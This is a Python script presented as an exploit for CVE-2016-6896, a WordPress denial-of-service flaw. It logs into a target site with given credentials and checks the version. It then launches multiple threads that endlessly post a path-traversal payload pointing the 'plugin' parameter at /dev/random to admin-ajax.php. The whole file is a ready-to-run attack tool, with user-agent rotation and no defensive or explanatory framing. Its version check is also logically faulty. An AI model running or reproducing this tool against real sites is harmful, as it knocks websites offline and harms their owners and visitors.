from huepy import bad, info
from requests import Session
from argparse import ArgumentParser, RawTextHelpFormatter
from threading import Thread
from typing import List
import random
from randua import generate as randua
import re

parser = ArgumentParser(description="Exploit for CVE-2016-6896",
                        formatter_class=RawTextHelpFormatter)

parser.add_argument("--target",
                    "-t",
                    help="target URL to exploit with path",
                    metavar="URL",
                    required=True,
                    dest="target")

parser.add_argument("--username",
                    "-u",
                    help="username of wordpress site",
                    metavar="USERNAME",
                    required=True,
                    dest="user")
parser.add_argument("--password",
                    "-p",
                    help="password of wordpress site",
                    metavar="PASSWORD",
                    required=True,
                    dest="passwd")
parser.add_argument("--threads",
                    "-T",
                    type=int,
                    help="number of workers to exploit with (default: 5)",
                    default=5,
                    dest="workers")

args = parser.parse_args()


def dosser(id: int):
    global args
    with Session() as http:
        data = {
            "log": args.user,
            "pwd": args.passwd,
            "wp-submit": "Log+In",
            "redirect_to": "%2f",
            "testcookie": random.randint(10, 80)
        }

        if args.target.endswith("/"):
            args.target = args.target[:-1]

        r = http.post("%s/wp-login.php" % args.target,
                      headers={"User-Agent": randua()},
                      data=data)

        if r.status_code != 200:
            print(
                bad("Worker %d is unable to login with %s / %s" %
                    (id, args.user, args.passwd)))
            return

        print(info("Worker %d logged in" % id))
        version = None
        i = 0
        while not version and i < 5:
            r = http.get("%s/wp-admin/index.php" % args.target)
            version = re.findall(r"Version [0-9]+\.[0-9]+\.[0-9]+",
                                 r.content.decode())
            i += 1

        if not version:
            print(bad("Worker %d is down" % id))
            return

        _, version = version[0].split()
        major, minor, patch = [*map(int, version.split("."))]

        if major != 4 and (minor < 5 and major > 10):
            print(bad("Worker %d is down" % id))
            return

        print(info("Worker %d launched the dos" % id))
        data = {
            "plugin": "../../../../../../../../../../dev/random",
            "action": "update-plugin"
        }
        while True:
            http.post("%s/wp-admin/admin-ajax.php" % args.target, data=data)

        pass
    pass


print(info("Started doser against '%s'" % args.target))
threads: List[Thread] = []
for _ in range(args.workers):
    t = Thread(target=dosser, args=(_ + 1, ))
    t.start()
    print(info("Worker %d is up" % (_ + 1)))
    threads.append(t)

for thread in threads:
    thread.join()
